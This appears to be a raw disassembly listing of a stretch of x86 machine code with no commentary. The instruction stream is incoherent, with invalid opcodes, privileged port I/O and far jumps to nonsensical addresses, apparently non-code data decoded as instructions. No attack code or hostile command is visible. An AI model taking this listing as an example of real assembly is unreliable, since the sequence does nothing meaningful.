  43b8b4:	sbb    edx,DWORD PTR [esi+esi*2+0x6cd2d7d4]
  43b8bb:	retf   
  43b8bc:	xchg   BYTE PTR [edx+0x4589040d],cl
  43b8c2:	rol    BYTE PTR [edi-0x2fca4b50],cl
  43b8c8:	jbe    0x43b892
  43b8ca:	mov    DWORD PTR [edx+eax*1+0x62],ebp
  43b8ce:	imul   esi,DWORD PTR [ebx-0x4a],0x7d
  43b8d2:	and    dh,BYTE PTR [eax]
  43b8d4:	or     al,0x15
  43b8d6:	ins    BYTE PTR es:[edi],dx
  43b8d7:	rcl    BYTE PTR [edi+ecx*8],1
  43b8da:	sub    esp,edx
  43b8dc:	jbe    0x43b8e2
  43b8de:	aad    0x8b
  43b8e0:	cmp    al,0x37
  43b8e2:	mov    cs,ebx
  43b8e4:	inc    ecx
  43b8e5:	sbb    eax,0x295cdd5
  43b8ea:	aas    
  43b8eb:	mov    ds:0xe0231f22,eax
  43b8f0:	out    0xa2,al
  43b8f2:	loop   0x43b957
  43b8f4:	pop    ss
  43b8f5:	sub    al,0xa9
  43b8f7:	mov    dh,0x6b
  43b8f9:	add    esp,DWORD PTR [eax-0x5f]
  43b8fc:	sub    BYTE PTR [eax+0x25],al
  43b8ff:	lock (bad) 
  43b901:	nop
  43b902:	add    al,0x4b
  43b904:	mov    cl,0x44
  43b906:	mov    ds:0xb86e971a,eax
  43b90b:	mov    ah,0xd1
  43b90d:	add    al,0xf3
  43b90f:	in     eax,0xcf
  43b911:	(bad)  [edi+0x2bad46c7]
  43b917:	ins    DWORD PTR es:[edi],dx
  43b918:	or     dl,BYTE PTR [ebp-0x2a]
  43b91b:	ins    DWORD PTR es:[edi],dx
  43b91c:	jp     0x43b932
  43b91e:	push   ebx
  43b91f:	push   cs
  43b920:	jno    0x43b8fd
  43b922:	call   0xc6450ac7
  43b927:	in     eax,dx
  43b928:	fisttp QWORD PTR [eax]
  43b92a:	iret   
  43b92b:	push   ebp
  43b92c:	cs sbb al,0x41
  43b930:	dec    eax
  43b931:	test   BYTE PTR [eax],0xb4
  43b934:	sub    BYTE PTR [edx+0x13],ah
  43b937:	sar    DWORD PTR [edx+edx*1-0x2fcb7a66],1
  43b93e:	mov    dh,0x5
  43b940:	push   0xda9bdb2
  43b945:	mov    esp,0xe2bb0e0e
  43b94a:	inc    ebx
  43b94b:	add    al,0xc1
  43b94d:	sahf   
  43b94e:	and    al,0x4e
  43b950:	mov    ds:0x40d41227,al
  43b955:	adc    al,0x62
  43b957:	cdq    
  43b958:	ins    BYTE PTR es:[edi],dx
  43b959:	sub    al,0x2c
  43b95b:	je     0x43b921
  43b95d:	lds    edx,FWORD PTR [eax+0x61]
  43b960:	icebp  
  43b961:	arpl   WORD PTR [ecx+0x5a],sp
  43b964:	add    dl,bl
  43b966:	sbb    ebp,DWORD PTR cs:[ecx]
  43b969:	pop    ebp
  43b96a:	inc    esi
  43b96b:	stc    
  43b96c:	mov    dh,0xf1
  43b96e:	xor    al,0xc1
  43b970:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43b971:	mov    ?,esp
  43b973:	inc    esp
  43b974:	sub    DWORD PTR [eax-0x3d],ecx
  43b977:	gs je  0x43b9af
  43b97a:	adc    al,0xb0
  43b97c:	add    eax,0x747be6fc
  43b981:	cs xchg ecx,eax
  43b983:	sub    DWORD PTR [eax+0x158a6811],edi
  43b989:	jb     0x43b98f
  43b98b:	sahf   
  43b98c:	aad    0x86
  43b98e:	add    dh,BYTE PTR [esi]
  43b990:	adc    DWORD PTR [ebx+0x9b3054b],0x8b0436da
  43b99a:	pop    ds
  43b99b:	mov    ch,0xbc
  43b99d:	mov    dh,0x60
  43b99f:	aad    0xa0
  43b9a1:	fisubr DWORD PTR [ebp-0x78d5e8c8]
  43b9a7:	adc    DWORD PTR ds:0xba209a37,esi
  43b9ad:	ins    DWORD PTR es:[edi],dx
  43b9ae:	sbb    esi,DWORD PTR [ebx-0x15f3349e]
  43b9b4:	dec    ecx
  43b9b5:	pop    ebp
  43b9b6:	jne    0x43b9f9
  43b9b8:	dec    ebx
  43b9b9:	cwde   
  43b9ba:	pop    edx
  43b9bb:	mov    bl,0xe8
  43b9bd:	bound  ebp,QWORD PTR [eax-0x80]
  43b9c0:	sbb    eax,0x5bd74b00
  43b9c5:	add    ecx,esp
  43b9c7:	data16 mov dh,0x6a
  43b9ca:	mov    ds:0x40c5076d,eax
  43b9cf:	add    ah,BYTE PTR [ebp-0x2ab6c822]
  43b9d5:	ins    DWORD PTR es:[edi],dx
  43b9d6:	jmp    0x43b97a
  43b9d8:	xchg   esp,ebp
  43b9da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43b9db:	scas   al,BYTE PTR es:[edi]
  43b9dc:	mov    al,0x81
  43b9de:	xor    ebx,ebx
  43b9e0:	scas   al,BYTE PTR es:[edi]
  43b9e1:	mov    BYTE PTR [esi-0x6f],dh
  43b9e4:	mov    DWORD PTR [edi],eax
  43b9e6:	jmp    0x6e22:0x15b32f94
  43b9ed:	in     eax,0xb
  43b9ef:	jg     0x43ba07
  43b9f1:	add    BYTE PTR [edx+0xa850e3e],bh
  43b9f7:	push   esp
  43b9f8:	mov    bh,0xad
  43b9fa:	and    ebx,esi
  43b9fc:	mov    ds:0xb6dd9e26,eax
  43ba01:	adc    dh,BYTE PTR [esi+0x5445dbe5]
  43ba07:	push   ecx
  43ba08:	loop   0x43b9ab
  43ba0a:	dec    ebp
  43ba0b:	dec    edi
  43ba0c:	mov    dh,0x7e
  43ba0e:	call   0x6cc9233
  43ba13:	rol    DWORD PTR [eax+0x58],cl
  43ba16:	inc    edi
  43ba17:	lds    esi,FWORD PTR [esi-0x25]
  43ba1a:	mov    bh,0x55
  43ba1c:	adc    al,0x61
  43ba1e:	fimul  DWORD PTR [esi]
  43ba20:	cli    
  43ba21:	ret    0x85b7
  43ba24:	(bad)  
  43ba25:	ins    DWORD PTR es:[edi],dx
  43ba26:	inc    edx
  43ba27:	mov    DWORD PTR ds:0xe85d87ec,0x8324aa03
  43ba31:	mov    ch,0xdf
  43ba33:	lods   eax,DWORD PTR ds:[esi]
  43ba34:	ins    BYTE PTR es:[edi],dx
  43ba35:	mov    al,0x82
  43ba37:	enter  0xb630,0xce
  43ba3b:	xor    bl,BYTE PTR [ecx-0x5512abf2]
  43ba41:	mov    eax,0x9cbc1517
  43ba46:	or     ebx,DWORD PTR [eax+0x746e29b6]
  43ba4c:	sbb    BYTE PTR ds:0xebae3e72,ah
  43ba52:	sub    al,0x62
  43ba54:	lods   eax,DWORD PTR ds:[esi]
  43ba55:	inc    eax
  43ba56:	mov    esi,DWORD PTR [esi-0x3d0ea77b]
  43ba5c:	jecxz  0x43b9f0
  43ba5e:	mov    cl,0x2d
  43ba60:	fisttp QWORD PTR [edx]
  43ba62:	cdq    
  43ba63:	or     ecx,esp
  43ba65:	imul   ecx,DWORD PTR [eax],0x74
  43ba68:	ror    DWORD PTR [eax-0x30],1
  43ba6b:	fidiv  DWORD PTR [esi]
  43ba6d:	push   eax
  43ba6e:	push   edx
  43ba6f:	lds    eax,FWORD PTR [ebp-0x50]
  43ba72:	jnp    0x43ba02
  43ba74:	pop    edx
  43ba75:	adc    esi,DWORD PTR [ebx+esi*2-0x17]
  43ba79:	sbb    al,bl
  43ba7b:	outs   dx,BYTE PTR ds:[esi]
  43ba7c:	pusha  
  43ba7d:	(bad)  
  43ba7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43ba7f:	add    DWORD PTR [ebp+0x6a],ebx
  43ba82:	xchg   ebp,eax
  43ba83:	mov    ds:0x348f9e76,eax
  43ba88:	nop
  43ba89:	sub    DWORD PTR [esi],0x74
  43ba8c:	mov    dh,0xa0
  43ba8e:	jae    0x43ba4d
  43ba90:	sub    DWORD PTR [edx+0x745057],esi
  43ba96:	push   ss
  43ba97:	sbb    eax,0xa003b006
  43ba9c:	ins    DWORD PTR es:[edi],dx
  43ba9d:	test   eax,0x1f18c23d
  43baa2:	mov    esp,0xd6ed0b37
  43baa7:	adc    BYTE PTR [eax],dh
  43baa9:	(bad)  
  43baaa:	xchg   ebp,eax
  43baab:	dec    ebx
  43baac:	sar    BYTE PTR [ebp+eax*4+0x7adb6065],0xfe
  43bab4:	iret   
  43bab5:	add    BYTE PTR [ebx-0x1c],ch
  43bab8:	add    BYTE PTR [ebx-0xe],bl
  43babb:	push   edx
  43babc:	xchg   edi,eax
  43babd:	imul   ecx,DWORD PTR [eax],0xeb76c557
  43bac3:	add    edx,edx
  43bac5:	inc    edx
  43bac6:	pop    ds
  43bac7:	inc    ebx
  43bac8:	jecxz  0x43ba92
  43baca:	ret    0x8a99
  43bacd:	jbe    0x43badf
  43bacf:	xchg   ecx,eax
  43bad0:	jne    0x43baba
  43bad2:	sbb    cl,dl
  43bad4:	inc    esi
  43bad5:	mov    ebx,0x9c31e041
  43bada:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43badb:	daa    
  43badc:	sbb    DWORD PTR [ebx+0x5d],ebx
  43badf:	inc    ebp
  43bae0:	ins    BYTE PTR es:[edi],dx
  43bae1:	adc    al,0xb3
  43bae3:	and    dh,BYTE PTR [edx]
  43bae5:	call   0x6c43fe00
  43baea:	push   ecx
  43baeb:	scas   al,BYTE PTR es:[edi]
  43baec:	mov    ds:0xe8a09a33,eax
  43baf1:	inc    edx
  43baf2:	and    BYTE PTR [edi+0x21],bh
  43baf5:	cwde   
  43baf6:	stc    
  43baf7:	adc    al,BYTE PTR [ebx]
  43baf9:	inc    ebp
  43bafa:	ins    BYTE PTR es:[edi],dx
  43bafb:	pop    ss
  43bafc:	test   eax,0x76179a3f
  43bb01:	out    0x88,eax
  43bb03:	sbb    bl,0x52
  43bb06:	shl    BYTE PTR ds:0x5bf905c9,0xa0
  43bb0d:	inc    ecx
  43bb0e:	cmp    eax,0x41c0b0ed
  43bb13:	cmc    
  43bb14:	retf   0x9a95
  43bb17:	sub    BYTE PTR [edx-0x214329eb],bh
  43bb1d:	inc    ebx
  43bb1e:	xor    cl,dh
  43bb20:	push   es
  43bb21:	stos   BYTE PTR es:[edi],al
  43bb22:	pop    edx
  43bb23:	or     BYTE PTR ds:0x1d1ef4b,al
  43bb29:	adc    eax,0xaa03f9db
  43bb2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43bb30:	lods   eax,DWORD PTR ds:[esi]
  43bb31:	xchg   esi,eax
  43bb32:	lea    ebx,[edi+0x15]
  43bb35:	push   ebx
  43bb36:	mov    al,0x1b
  43bb38:	aas    
  43bb39:	or     cl,BYTE PTR [esi]
  43bb3b:	jle    0x43bb31
  43bb3d:	fcmovnu st,st(2)
  43bb3f:	mov    dh,0x25
  43bb41:	icebp  
  43bb42:	sub    al,0xb0
  43bb44:	popf   
  43bb45:	add    al,0xf7
  43bb47:	mov    eax,ds:0x8ec50305
  43bb4c:	mov    al,ds:0x7037b7d6
  43bb51:	aad    0x85
  43bb53:	push   esi
  43bb54:	inc    ecx
  43bb55:	dec    eax
  43bb56:	jmp    0x43bbbc
  43bb58:	pop    ecx
  43bb59:	jmp    0xeab0:0xb285f2e2
  43bb60:	mov    cs,WORD PTR [edi-0x12]
  43bb63:	add    BYTE PTR [ebx+0x44],dl
  43bb66:	int3   
  43bb67:	jne    0x43bb7a
  43bb69:	shr    DWORD PTR [esi+0x22ee4aed],1
  43bb6f:	add    BYTE PTR fs:[edx],bl
  43bb72:	and    bh,BYTE PTR [edx-0x543282ec]
  43bb78:	push   edi
  43bb79:	xor    eax,0xc2a0fc44
  43bb7e:	or     DWORD PTR [edi-0x4abbfdb6],edx
  43bb84:	jne    0x43bbb2
  43bb86:	add    bl,BYTE PTR [esi+esi*1]
  43bb89:	mov    cl,0xbf
  43bb8b:	mov    ebp,ebx
  43bb8d:	call   0xac9a:0x1d6f7620
  43bb94:	cmp    al,0xe
  43bb96:	or     eax,0xa0bed8ab
  43bb9b:	mov    dl,0xda
  43bb9d:	mov    dl,0xc5
  43bb9f:	cmp    al,0x23
  43bba1:	pop    ss
  43bba2:	ins    DWORD PTR es:[edi],dx
  43bba3:	sbb    eax,0xe5eadc40
  43bba8:	jb     0x43bb4c
  43bbaa:	cli    
  43bbab:	mov    edi,0xba20fbea
  43bbb0:	ins    DWORD PTR es:[edi],dx
  43bbb1:	and    bl,cl
  43bbb3:	or     ebp,esp
  43bbb5:	inc    edx
  43bbb6:	clc    
  43bbb7:	push   esp
  43bbb8:	mov    bl,0xb6
  43bbba:	and    edx,ebp
  43bbbc:	push   esi
  43bbbd:	sub    eax,esp
  43bbbf:	dec    ebx
  43bbc0:	dec    ebx
  43bbc1:	retf   0xbc55
  43bbc4:	pop    ss
  43bbc5:	add    DWORD PTR [ebp-0x49],ebp
  43bbc8:	mov    edi,0x79da6ffb
  43bbcd:	lock mov ds:0x916d6e0b,eax
  43bbd3:	cmpps  xmm3,XMMWORD PTR [ebx-0x4e44fe72],0x45
  43bbdb:	push   eax
  43bbdc:	inc    ebp
  43bbdd:	fld    TBYTE PTR [ebp-0x51]
  43bbe0:	add    eax,0x18aa2998
  43bbe5:	in     eax,dx
  43bbe6:	jmp    0x43bc2e
  43bbe8:	(bad)  [edx-0x7b]
  43bbeb:	cmp    al,0x14
  43bbed:	dec    ebx
  43bbee:	xchg   esp,eax
  43bbef:	sbb    edx,DWORD PTR [ebx]
  43bbf1:	xchg   esp,eax
  43bbf2:	pop    ss
  43bbf3:	add    BYTE PTR [ebp+ebx*8-0x6640634a],dh
  43bbfa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43bbfb:	xlat   BYTE PTR fs:[ebx]
  43bbfd:	mov    bl,0xe7
  43bbff:	lods   eax,DWORD PTR ds:[esi]
  43bc00:	sbb    esp,DWORD PTR [ebp-0xc8672b3]
  43bc06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43bc07:	in     eax,dx
  43bc08:	gs sti 
  43bc0a:	in     eax,0xdc
  43bc0c:	push   0x5
  43bc0e:	test   ebx,ebp
  43bc10:	xchg   ecx,eax
  43bc11:	add    eax,0x2dfa7552
  43bc16:	mov    edi,0x598b54d1
  43bc1b:	inc    edx
  43bc1c:	push   0xffffffd7
  43bc1e:	add    BYTE PTR [ebp+ebx*8-0x2a],bh
  43bc22:	fiadd  DWORD PTR [eax]
  43bc24:	shr    BYTE PTR [ebp-0x5ad76432],1
  43bc2a:	out    0x18,al
  43bc2c:	test   eax,0xa02ed444
  43bc31:	dec    edx
  43bc32:	cmp    DWORD PTR [ecx+0x36d6e220],eax
  43bc38:	sti    
  43bc39:	adc    ch,BYTE PTR [ecx+edx*1-0x275df8fe]
  43bc40:	push   ebp
  43bc41:	jno    0x43bcae
  43bc43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43bc44:	sub    al,0xe
  43bc46:	add    esi,DWORD PTR [ecx+0x609b27cc]
  43bc4c:	inc    ebx
  43bc4d:	jne    0x43bcca
  43bc4f:	popf   
  43bc50:	and    al,0xa4
  43bc52:	retf   0x2075
  43bc55:	in     eax,dx
  43bc56:	jge    0x43bc35
  43bc58:	xchg   esi,eax
  43bc59:	mov    dh,0xe
  43bc5b:	push   ebx
  43bc5c:	les    ebp,FWORD PTR [edx+0x11f905dc]
  43bc62:	in     al,0x4f
  43bc64:	or     eax,0x675453d1
  43bc69:	jnp    0x43bc3e
  43bc6b:	int    0xd7
  43bc6d:	test   al,0x8e
  43bc6f:	stos   BYTE PTR es:[edi],al
  43bc70:	jge    0x43bcf0
  43bc72:	rcr    DWORD PTR [ebx],cl
  43bc74:	jecxz  0x43bbfc
  43bc76:	bound  eax,QWORD PTR [edi+0x55]
  43bc79:	and    al,al
  43bc7b:	mov    eax,ds:0x82263c1b
  43bc80:	or     eax,0x1cb28da0
  43bc85:	push   edi
  43bc86:	dec    ebp
  43bc87:	inc    esp
  43bc88:	je     0x43bc0d
  43bc8a:	mov    bh,0xb0
  43bc8c:	mov    edi,0xdb95622e
  43bc91:	push   esp
  43bc92:	pop    ebx
  43bc93:	inc    edi
  43bc94:	rol    BYTE PTR ds:0xbbfb3a0b,1
  43bc9a:	or     eax,0xa01b45bf
  43bc9f:	pusha  
  43bca0:	xor    DWORD PTR [esi+0x61],esi
  43bca3:	in     al,dx
  43bca4:	in     eax,dx
  43bca5:	or     dl,bl
  43bca7:	inc    ebp
  43bca8:	scas   al,BYTE PTR es:[edi]
  43bca9:	push   eax
  43bcaa:	cld    
  43bcab:	shl    BYTE PTR [ecx-0x22],cl
  43bcae:	push   edi
  43bcaf:	adc    DWORD PTR [ebp+0x6c],ebp
  43bcb2:	xor    bh,0x3f
  43bcb5:	shl    ebx,1
  43bcb7:	add    esi,ebp
  43bcb9:	test   eax,0x44ad665b
  43bcbe:	vminpd xmm0,xmm6,XMMWORD PTR [edx]
  43bcc2:	add    al,0x71
  43bcc4:	imul   ebp,DWORD PTR [ebx],0xe374ce46
  43bcca:	dec    edx
  43bccb:	mov    dl,0xd1
  43bccd:	xchg   BYTE PTR [eax],al
  43bccf:	jbe    0x43bcb1
  43bcd1:	xor    ecx,DWORD PTR [ebx+eiz*1+0x89a8716]
  43bcd8:	ficom  DWORD PTR [ebp-0x69]
  43bcdb:	sbb    eax,0x6b0bb5b9
  43bce0:	sbb    al,0x0
  43bce3:	jmp    0xbf60787a
  43bce8:	mov    ds:0x1e68a58a,eax
  43bced:	retf   
  43bcee:	xchg   ebp,eax
  43bcef:	sti    
  43bcf0:	in     eax,dx
  43bcf1:	(bad)  
  43bcf2:	push   ebp
  43bcf3:	mov    cl,0x31
  43bcf5:	lahf   
  43bcf6:	push   es
  43bcf7:	int    0xb6
  43bcf9:	jmp    0x43bd78
  43bcfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43bcfc:	fwait
  43bcfd:	mov    ds:0xb66695ba,al
  43bd02:	lock push edx
  43bd04:	mov    edi,0x6a2b57f4
  43bd09:	or     DWORD PTR [edx-0x44],ebp
  43bd0c:	adc    ch,BYTE PTR [esi+0x57]
  43bd0f:	ins    BYTE PTR es:[edi],dx
  43bd10:	pop    ebx
  43bd11:	pop    es
  43bd12:	mov    ah,0xcf
  43bd14:	dec    ebp
  43bd15:	test   eax,0xd7dfbff5
  43bd1a:	aam    0x35
  43bd1c:	push   ecx
  43bd1d:	sub    al,0x11
  43bd1f:	imul   ecx,DWORD PTR [ebx],0x2b62b656
  43bd25:	push   ebp
  43bd26:	mov    ebx,0xc539a7a1
  43bd2b:	pop    ecx
  43bd2c:	lods   eax,DWORD PTR ds:[esi]
  43bd2d:	pushf  
  43bd2e:	sbb    ah,BYTE PTR [edx-0x46ae7ca5]
  43bd34:	call   0x85a5:0xa08b2817
  43bd3b:	fcom   DWORD PTR [ebx+eiz*4]
  43bd3e:	fist   DWORD PTR [ecx]
  43bd40:	loopne 0x43bd68
  43bd42:	mov    dh,0x82
  43bd44:	mov    dh,0xa9
  43bd46:	push   es
  43bd47:	xchg   esi,eax
  43bd48:	or     esp,edx
  43bd4a:	jno    0x43bd13
  43bd4c:	jb     0x43bccf
  43bd4e:	cs sub cl,bh
  43bd51:	outs   dx,DWORD PTR ds:[esi]
  43bd52:	and    DWORD PTR [ecx-0x7],ecx
  43bd55:	add    BYTE PTR ss:[edi+esi*4-0x3e],ch
  43bd5a:	pusha  
  43bd5b:	int    0x5
  43bd5d:	int    0x8b
  43bd5f:	popa   
  43bd60:	div    BYTE PTR [esi]
  43bd62:	add    DWORD PTR [ebx],edi
  43bd64:	cmp    BYTE PTR ds:0x78f4e967,0xfe
  43bd6b:	sahf   
  43bd6c:	pop    edx
  43bd6d:	pop    eax
  43bd6e:	fisub  DWORD PTR [eax]
  43bd70:	rcl    BYTE PTR [esi*8+0xfc391a9],cl
  43bd77:	nop
  43bd78:	add    DWORD PTR [edx-0x56],ebx
  43bd7b:	xor    ebx,DWORD PTR [ebx+0x6ad1b177]
  43bd81:	sbb    ebp,ebx
  43bd83:	and    al,BYTE PTR ds:0x228f48dd
  43bd89:	sbb    BYTE PTR ds:0x980f3a01,0x68
  43bd90:	add    ebp,DWORD PTR ds:0xa827936d
  43bd96:	mov    edi,0xb228fe99
  43bd9b:	push   0x8409adb7
  43bda0:	enter  0xc7b9,0x98
  43bda4:	out    0x43,eax
  43bda6:	mov    al,0x5b
  43bda8:	mov    ds:0xe56a5a5a,al
  43bdad:	into   
  43bdae:	(bad)  
  43bdaf:	stos   DWORD PTR es:[edi],eax
  43bdb0:	js     0x43bd7d
  43bdb2:	je     0x43bda5
  43bdb4:	outs   dx,BYTE PTR ds:[esi]
  43bdb5:	pop    ebx
  43bdb6:	mov    dh,0xef
  43bdb8:	mov    al,0xe3
  43bdba:	imul   edx,edi,0x2a
  43bdbd:	fcmovu st,st(4)
  43bdbf:	mov    dh,0xb6
  43bdc1:	push   ecx
  43bdc2:	mov    DWORD PTR [edx+0x17],edi
  43bdc5:	fcmovbe st,st(1)
  43bdc7:	mov    al,0xb3
  43bdc9:	add    DWORD PTR ds:0xaf447474,edx
  43bdcf:	test   eax,0x1b0423e1
  43bdd4:	mov    al,bl
  43bdd6:	mov    dh,0x94
  43bdd8:	sbb    al,0xf5
  43bdda:	test   al,0x14
  43bddc:	mov    BYTE PTR [edx-0x25],ch
  43bddf:	adc    DWORD PTR [ebp-0x4b],eax
  43bde2:	sbb    DWORD PTR [edx+0xa],ebp
  43bde5:	fadd   DWORD PTR [eax+0x4]
  43bde8:	cmp    esp,DWORD PTR [ecx-0x64d8d170]
  43bdee:	or     eax,0xa29b6b60
  43bdf3:	sub    eax,0xb6a7ca64
  43bdf8:	popa   
  43bdf9:	adc    edx,DWORD PTR [ecx]
  43bdfb:	jne    0x43be11
  43bdfd:	std    
  43bdfe:	faddp  st(4),st
  43be00:	or     BYTE PTR [eax],dl
  43be02:	mov    ebx,0xd07e682a
  43be07:	fs push esp
  43be09:	shl    DWORD PTR [ecx-0x7e],1
  43be0c:	pop    ebx
  43be0d:	inc    ebx
  43be0e:	leave  
  43be0f:	ins    DWORD PTR es:[edi],dx
  43be10:	mov    edi,0x45c8f974
  43be15:	aaa    
  43be16:	fadd   QWORD PTR [esi-0x80]
  43be19:	imul   ecx,DWORD PTR [ebx],0xa6911327
  43be1f:	or     ch,BYTE PTR [esi+0x1d]
  43be22:	pop    ds
  43be23:	sbb    DWORD PTR [edi+0x1136b62b],edi
  43be29:	scas   al,BYTE PTR es:[edi]
  43be2a:	clc    
  43be2b:	sar    DWORD PTR [edi],1
  43be2d:	mov    ebp,0x39933a9
  43be32:	mov    dh,0xdd
  43be34:	rol    BYTE PTR ds:0xa0051426,0xda
  43be3b:	sahf   
  43be3c:	or     esi,DWORD PTR [eax-0x405a576b]
  43be42:	or     al,0xc7
  43be44:	stos   BYTE PTR es:[edi],al
  43be45:	sti    
  43be46:	or     eax,esp
  43be48:	inc    edx
  43be49:	mov    ecx,0x644af76a
  43be4e:	fld    QWORD PTR [ebx+0x68]
  43be51:	adc    cl,BYTE PTR [ebx]
  43be53:	lods   eax,DWORD PTR ds:[esi]
  43be54:	mov    ds:0xf179ead1,al
  43be59:	fldcw  WORD PTR [ebp-0x80]
  43be5c:	mov    ah,ch
  43be5e:	hlt    
  43be5f:	jno    0x43becc
  43be61:	push   ecx
  43be62:	loopne 0x43bed9
  43be64:	pop    ebp
  43be65:	push   eax
  43be66:	mov    bh,0xad
  43be68:	push   cs
  43be69:	mov    ecx,0x4bf2cec2
  43be6e:	jbe    0x43be1f
  43be70:	shr    BYTE PTR [esi],1
  43be72:	mov    ds:0x1b033b6,al
  43be77:	std    
  43be78:	mov    ecx,DWORD PTR [ecx]
  43be7a:	loopne 0x43be32
  43be7c:	jne    0x43bed2
  43be7e:	mov    dl,BYTE PTR [edi-0x49eb7544]
  43be84:	and    ecx,DWORD PTR ds:0x783b105
  43be8a:	sahf   
  43be8b:	add    al,0x75
  43be8d:	stos   BYTE PTR es:[edi],al
  43be8e:	mov    ds:0x29b6d6cb,al
  43be93:	add    eax,0xa3cecb13
  43be98:	mov    dh,0xe6
  43be9a:	je     0x43beed
  43be9c:	rol    BYTE PTR [esi],1
  43be9e:	mov    bh,BYTE PTR [edx+ebx*8-0x74]
  43bea2:	jg     0x43be7a
  43bea4:	adc    al,0xdc
  43bea6:	jo     0x43be95
  43bea8:	inc    ebp
  43bea9:	push   edx
  43beaa:	fnstcw WORD PTR [esi+0x7b]
  43bead:	enter  0xbb04,0xe2
  43beb1:	(bad)  
  43beb2:	jb     0x43bf0e
  43beb4:	ins    BYTE PTR es:[edi],dx
  43beb5:	stc    
  43beb6:	daa    
  43beb7:	pop    edx
  43beb8:	shl    BYTE PTR [eax+esi*4-0x2b],cl
  43bebc:	inc    ebp
  43bebd:	or     al,0x6e
  43bebf:	xchg   esp,eax
  43bec0:	dec    edx
  43bec1:	fstp   QWORD PTR [ecx+0x44d1b6db]
  43bec7:	xor    DWORD PTR [ebx],0xfffffff6
  43beca:	sbb    eax,0x3dbc14a1
  43becf:	shr    DWORD PTR [esi],0xaa
  43bed2:	pop    ebx
  43bed3:	jae    0x43bf07
  43bed5:	mov    ebp,0x7cb31935
  43beda:	jns    0x43beb7
  43bedc:	inc    esp
  43bedd:	lods   al,BYTE PTR ds:[esi]
  43bede:	adc    ebx,DWORD PTR [ebp+0x2300a802]
  43bee4:	cmp    eax,0x26210080
  43bee9:	sub    ch,0xb6
  43beec:	sub    al,0x20
  43beee:	sbb    edx,DWORD PTR [ebp-0x6b]
  43bef1:	inc    eax
  43bef2:	(bad)
  43bef5:	mov    DWORD PTR [ebp+0x58fe88ef],0xf6bfc0fc
  43beff:	push   esp
  43bf00:	add    dh,dl
  43bf02:	imul   ebp,DWORD PTR [edx+0x53],0xf7bcb710
  43bf09:	pop    esp
  43bf0a:	int    0xcd
  43bf0c:	push   esi
  43bf0d:	fdiv   DWORD PTR [esi]
  43bf0f:	cmp    cl,BYTE PTR [edx-0x2bd3e4e]
  43bf15:	and    edi,ebp
  43bf17:	mov    dh,0xc3
  43bf19:	add    al,0xdc
  43bf1b:	aas    
  43bf1c:	test   BYTE PTR [ebx],ch
  43bf1e:	popf   
  43bf1f:	in     al,0x9f
  43bf21:	ss mov bl,0xba
  43bf24:	mov    al,ds:0x3976ae1b
  43bf29:	cdq    
  43bf2a:	sbb    ah,ch
  43bf2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43bf2d:	xor    eax,0xcbd97105
  43bf32:	mov    dl,BYTE PTR [ebx+0x71b1b238]
  43bf38:	mov    eax,ds:0xa005baa9
  43bf3d:	pop    ss
  43bf3e:	test   BYTE PTR [ebp+ebp*2-0x5de4319a],bh
  43bf45:	outs   dx,BYTE PTR ds:[esi]
  43bf46:	or     eax,0x56bf40f0
  43bf4b:	cmc    
  43bf4c:	add    esi,DWORD PTR [edx-0x10]
  43bf4f:	mov    dh,0xd5
  43bf51:	adc    BYTE PTR [esi+ecx*8-0x25],ch
  43bf55:	je     0x43bfa8
  43bf57:	mov    es,WORD PTR [edi+0x8]
  43bf5a:	inc    esp
  43bf5b:	ins    DWORD PTR es:[edi],dx
  43bf5c:	add    al,ch
  43bf5e:	dec    eax
  43bf5f:	test   BYTE PTR [esi-0x557500a8],0xb
  43bf66:	sbb    eax,0x5fa97142
  43bf6b:	mov    edx,0xec0c0fa5
  43bf70:	sbb    BYTE PTR [ecx],ch
  43bf72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43bf73:	mov    ds:0xdbb0219e,eax
  43bf78:	jbe    0x43bf03
  43bf7a:	ret    0xa134
  43bf7d:	jg     0x43bfe6
  43bf7f:	xor    BYTE PTR [ebx-0x7d466af2],dl
  43bf85:	xor    eax,0x7c0a1755
  43bf8a:	xchg   edi,eax
  43bf8b:	or     BYTE PTR [ebp+0x26c23918],dh
  43bf91:	and    bh,BYTE PTR [eax+0x1fb72fd7]
  43bf97:	lock inc ebp
  43bf99:	pop    esi
  43bf9a:	sbb    ebp,DWORD PTR [ebp+0x4b]
  43bf9d:	mov    ecx,0xa7c557bf
  43bfa2:	jmp    0x43bfba
  43bfa4:	ficomp WORD PTR [edx+0x6e]
  43bfa7:	ins    BYTE PTR es:[edi],dx
  43bfa8:	or     esi,DWORD PTR [esi-0x7]
  43bfab:	mov    bl,0xdc
  43bfad:	push   esp
  43bfae:	aad    0x70
  43bfb0:	dec    esi
  43bfb1:	sub    dh,BYTE PTR [esi]
  43bfb3:	rol    DWORD PTR [esi],0x35
  43bfb6:	loopne 0x43c00a
  43bfb8:	pop    ss
  43bfb9:	aad    0x4b
  43bfbb:	pop    ebp
  43bfbc:	mov    dh,0xd8
  43bfbe:	cmp    ah,BYTE PTR [ecx-0x27786d14]
  43bfc4:	mov    esi,0x55680b8b
  43bfc9:	je     0x43bfcb
  43bfcb:	push   ebp
  43bfcc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43bfcd:	js     0x43bfa5
  43bfcf:	add    BYTE PTR [ebp+0x10bc2adc],dh
  43bfd5:	rsqrtps xmm2,XMMWORD PTR [ebx-0x5d949226]
  43bfdc:	loopne 0x43bf70
  43bfde:	cmp    DWORD PTR [esi],ebp
  43bfe0:	cwde   
  43bfe1:	pop    ss
  43bfe2:	nop
  43bfe3:	adc    al,0x41
  43bfe5:	jne    0x43bfc2
  43bfe7:	fidivr DWORD PTR [ecx+0x56bf8530]
  43bfed:	mov    esp,0xa54bc548
  43bff2:	jo     0x43bfc4
  43bff4:	xor    al,0x62
  43bff6:	mov    al,0xcd
  43bff8:	into   
  43bff9:	push   ebp
  43bffa:	ins    DWORD PTR es:[edi],dx
  43bffb:	xchg   edi,eax
